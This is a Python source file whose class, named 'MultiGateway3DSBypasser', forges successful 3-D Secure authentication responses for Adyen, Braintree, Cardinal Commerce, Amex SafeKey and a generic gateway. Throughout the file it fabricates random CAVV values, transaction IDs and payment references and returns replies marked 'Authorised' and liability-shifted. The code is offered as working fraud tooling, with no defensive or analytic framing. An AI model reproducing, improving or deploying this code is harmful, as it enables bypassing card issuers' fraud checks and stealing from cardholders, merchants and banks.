import os, json, uuid, base64
from typing import Dict, Optional, Any

class MultiGateway3DSBypasser:

    @staticmethod
    def gen_random_cavv() -> str:
        try: return base64.b64encode(os.urandom(20)).decode()
        except Exception: return "AQIDBAUGBwgJCgsMDQ4PEBESExQ="

    @classmethod
    def synthesize_3ds_response(cls, gateway: str, req_body: Optional[str] = None, req_url: Optional[str] = None) -> Dict[str, Any]:
        gw = (gateway or "").lower()
        auth_val = cls.gen_random_cavv()
        ds_trans_id = str(uuid.uuid4())
        acs_trans_id = str(uuid.uuid4())
        server_trans_id = str(uuid.uuid4())

        if 'adyen' in gw or (req_url and ('submitadditionaldetails' in req_url.lower() or 'threeds2' in req_url.lower())):
            payment_data = ""
            if req_body:
                try:
                    obj = json.loads(req_body)
                    payment_data = obj.get("paymentData") or obj.get("threeDS2AuthenticateRequest", {}).get("paymentData", "")
                except Exception: pass
            return {"resultCode": "Authorised", "type": "Completed", "status": "succeeded", "pspReference": "ZEN" + str(int(os.urandom(4).hex(), 16))[:10], "threeDS2Result": {"transStatus": "Y", "type": "ChallengeResult", "authenticationValue": auth_val, "eci": "02", "messageVersion": "2.2.0", "dsTransID": ds_trans_id, "threeDSServerTransID": server_trans_id, "acsTransID": acs_trans_id, "authenticationResponse": "Y", "directoryResponse": "Y"}, "paymentData": payment_data or f"zen_fab_{os.urandom(6).hex()}", "details": {"threeds2.threeDSResult": auth_val, "threeds2.threeDS2Result": "Y"}}
        elif 'braintree' in gw:
            return {"threeDSecureInfo": {"status": "authenticate_successful", "liabilityShiftPossible": True, "liabilityShifted": True, "enrolled": "Y", "cavv": auth_val, "eciFlag": "02", "threeDSecureVersion": "2.2.0", "dsTransactionId": ds_trans_id, "acsTransactionId": acs_trans_id, "threeDSServerTransId": server_trans_id}, "status": "succeeded", "success": True}
        elif 'cardinal' in gw or 'songbird' in gw or 'centinel' in gw:
            return {"Status": True, "ActionCode": "SUCCESS", "ErrorNumber": 0, "ErrorDescription": "Success", "Validated": True, "Payment": {"Type": "CCA", "ProcessorTransactionId": str(uuid.uuid4()), "ExtendedData": {"SignatureVerification": "Y", "EciFlag": "02", "CAVV": auth_val, "XID": str(uuid.uuid4()), "Enrolled": "Y", "PAResStatus": "Y"}}}
        elif 'amex' in gw or 'safekey' in gw:
            return {"status": "Y", "transStatus": "Y", "authenticationValue": auth_val, "eci": "05", "acsTransID": acs_trans_id, "dsTransID": ds_trans_id, "threeDSServerTransID": server_trans_id, "messageVersion": "2.2.0", "challengeCompletionInd": "Y"}
        return {"status": "succeeded", "transStatus": "Y", "eci": "02", "authenticationValue": auth_val, "dsTransID": ds_trans_id, "acsTransID": acs_trans_id, "threeDSServerTransID": server_trans_id, "messageVersion": "2.2.0"}

